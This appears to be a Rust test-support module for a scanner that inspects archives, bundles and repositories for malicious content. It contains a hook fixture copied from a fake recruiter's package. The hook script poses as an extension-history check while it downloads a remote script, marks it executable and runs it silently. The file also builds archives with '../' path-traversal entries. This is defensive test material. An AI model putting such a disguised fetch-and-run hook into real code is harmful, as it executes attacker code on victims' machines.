use super::*;
use std::io::Write;

mod archives;
mod branches;
mod bundles_and_remotes;
mod known_campaigns;
mod repos;
mod viewer;

use repos::*;

/// The shape of the hook from the fake recruiter's pack, with a harmless address.
pub(super) const HOOK: &str = r#"#!/bin/sh
# Purpose: detect a Chrome or Mozilla extension history update.
URL="https://example-ext.vercel.app/api/m"
curl -fsSL "$URL" -o "$TMPDIR/run-command.sh"
chmod +x "$TMPDIR/run-command.sh"
"$TMPDIR/run-command.sh" > /dev/null 2>&1 &
exit 0
"#;

pub(super) struct F<'a> {
    pub(super) path: &'a str,
    pub(super) data: &'a [u8],
    pub(super) mode: u32,
}

pub(super) fn f<'a>(path: &'a str, data: &'a str) -> F<'a> {
    F { path, data: data.as_bytes(), mode: 0o644 }
}

pub(super) fn exe<'a>(path: &'a str, data: &'a str) -> F<'a> {
    F { path, data: data.as_bytes(), mode: 0o755 }
}

pub(super) fn zip_of(files: &[F]) -> tempfile::NamedTempFile {
    let tmp = tempfile::Builder::new().suffix(".zip").tempfile().unwrap();
    let mut zip = zip::ZipWriter::new(tmp.reopen().unwrap());
    for file in files {
        // Unix, so the permissions are kept: the writer defaults to DOS on Windows.
        let opts = zip::write::SimpleFileOptions::default().system(zip::System::Unix).unix_permissions(file.mode);
        zip.start_file(file.path, opts).unwrap();
        zip.write_all(file.data).unwrap();
    }
    zip.finish().unwrap();
    tmp
}

pub(super) fn tgz_of(files: &[F]) -> tempfile::NamedTempFile {
    let tmp = tempfile::Builder::new().suffix(".tar.gz").tempfile().unwrap();
    let gz = flate2::write::GzEncoder::new(tmp.reopen().unwrap(), flate2::Compression::default());
    let mut tar = tar::Builder::new(gz);
    for file in files {
        let mut header = tar::Header::new_gnu();
        // Written raw, because set_path refuses "../" paths, which is one thing under test.
        header.as_gnu_mut().unwrap().name[..file.path.len()].copy_from_slice(file.path.as_bytes());
        header.set_size(file.data.len() as u64);
        header.set_mode(file.mode);
        header.set_cksum();
        tar.append(&header, file.data).unwrap();
    }
    tar.into_inner().unwrap().finish().unwrap();
    tmp
}

pub(super) fn scan(file: &tempfile::NamedTempFile) -> Report {
    scan_path(file.path())
}

pub(super) fn titles(report: &Report) -> Vec<String> {
    report.findings.iter().map(|f| format!("{:?} {} | {}", f.level, f.path, f.title)).collect()
}
